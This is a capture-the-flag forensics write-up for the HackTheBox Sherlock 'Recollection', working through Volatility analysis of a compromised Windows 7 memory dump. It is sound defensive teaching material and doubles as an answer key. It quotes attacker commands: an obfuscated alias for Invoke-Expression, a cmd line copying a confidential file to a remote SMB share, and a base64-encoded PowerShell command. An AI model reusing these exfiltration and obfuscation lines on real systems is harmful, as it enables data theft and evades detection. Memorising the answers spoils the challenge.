---
title: Recollection
slug: htb-recollection
date: 2026-09-20
image: recollection
platform: HackTheBox
kind: Sherlock
os: Windows
difficulty: Easy
points: 535
tags: [hackthebox, sherlock, windows, easy, retired, dfir, windows-forensics, incident-response, volatility]
description: Windows 7 memory forensics with Volatility: obfuscated PowerShell, a failed exfiltration attempt and malware named after its own hash.
featured: true
---

# Scenario
A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.

---
### Question N1
**What is the Operating System of the machine?**
```js
vol2 -f recollection.bin imageinfo
```
Result:
```
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/ctf/Hackthebox/Sherlocks/Recollection/recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```
`Answer: Windows 7`

---
### Question N2
**When was the memory dump created?**
We already have this from the Volatility 2 response:
```
Image date and time : 2022-12-19 16:07:30 UTC+0000
```
`Answer: 2022-12-19 16:07:30`

---
### Question N3
**After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?**
Ill use **Win7SP1x64** profile for this binary.
```js
vol2 -f recollection.bin --profile=Win7SP1x64 clipboard
```
`Answer: (gv '*MDR*').naMe[3,11,2]-joIN''`

---
### Question N4
**The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?**
I entered this command in my PowerShell and got `iex` as an output.
```powershell
PS> (gv '*MDR*').naMe[3,11,2]-joIN''
```
`Answer: Invoke-Expression`

---
### Question N5
**A CMD command was executed to attempt to exfiltrate a file. What is the full command line?**
In Volatility:
```js
vol2 -f recollection.bin --profile=Win7SP1x64 cmdscan
```
`Answer: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`

---
### Question N6
**Following the above command, now tell us if the file was exfiltrated successfully?**
In Volatility:
```js
vol2 -f recollection.bin --profile=Win7SP1x64 consoles
```
There is a line about that command:
```powershell
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt                                                                
The network path was not found.
```
`Answer: No`

---
### Question N7
**The attacker tried to create a readme file. What was the full path of the file?**
In the same response we also have this:
```powershell
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
```
This looks like a Base64 string, i'll decode it with CyberChef:
```powershell
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```
`Answer: C:\Users\Public\Office\readme.txt`

---
### Question N8
**What was the Host Name of the machine?**
In the output from **Q6** we can see that the attacked executed `net user`.
```powershell
PS C:\Users\user> net users
User accounts for \\USER-PC                          
-------------------------------------------------------------------------------
Administrator            Guest                    user                         
```
`Answer: USER-PC`

---
### Question N9
**How many user accounts were in the machine?**
There were 3 users: Administrator, Guest, user.
`Answer: 3`

---
### Question N10
**In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?**
```js
vol2 -f recollection.bin --profile=Win7SP1x64 filescan | grep "passwords.txt"
```
`Answer: \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

---
### Question N11
**A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?**
In the response of the Q5 we can find this command.
```
Cmd #5 @ 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```
`Answer: b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`

---
### Question N12
**Following the previous question, what is the Imphash of the malicous file you found above?**
Search the file hash in Virustotal, and in Details we can see the Imphash of the file.
`Answer: d3b592cd9481e4f053b5362e22d61595`

---
### Question N13
**Following the previous question, tell us the date in UTC format when the malicious file was created?**
In the same tab we can see the creation time.
`Answer: 2022-06-22 11:49:04`

---
### Question N14
**What was the local IP address of the machine?**
```js
vol2 -f recollection.bin --profile=Win7SP1x64 netscan
```
`Answer: 192.168.0.104`

---
### Question N15
**There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?**
```js
vol2 -f recollection.bin --profile=Win7SP1x64 pstree
```
`Answer: cmd.exe`

---
### Question N16
**Attacker might have used an email address to login a social media. Can you tell us the email address?**
```
strings recollection.bin | findstr /i "@gmail.com @yahoo.com @outlook.com @hotmail.com @protonmail.com"
```
`Answer: mafia_code1337@gmail.com`

---
### Question N17
**Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?**
Earlier we have seen wazuh's `msi` file in the user's Downloads folder:
```powershell
PS C:\Users\user\Downloads> ls
    Directory: C:\Users\user\Downloads                                          
Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----     
-----        12/19/2022   2:59 PM     420864 b0ad704122d9cffddd57ec92991a1e99fc 
                                             1ac02d5b4d8fd31720978c02635cb1.exe 
-a---        12/19/2022   9:00 PM     313152 b0ad704122d9cffddd57ec92991a1e99fc 
                                             1ac02d5b4d8fd31720978c02635cb1.zip 
-a---        12/19/2022   9:00 PM     205646 bf9e9366489541153d0e2cd21bdae11591 
                                             f6be48407f896b75e1320628346b03.zip 
-a---        12/19/2022   3:00 PM     309248 csrsss.exe                            
-a---        12/17/2022   4:16 PM    5885952 wazuh-agent-4.3.10-1.msi
```
`Answer: wazuh`

---
### Question N18
**The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?**
In the same Downloads folder we can see a file called `csrsss.exe` which totally look out of place here since you won't see a legitimate version of this file on anywhere beside C:\Windows\System32
`Answer: csrsss.exe`
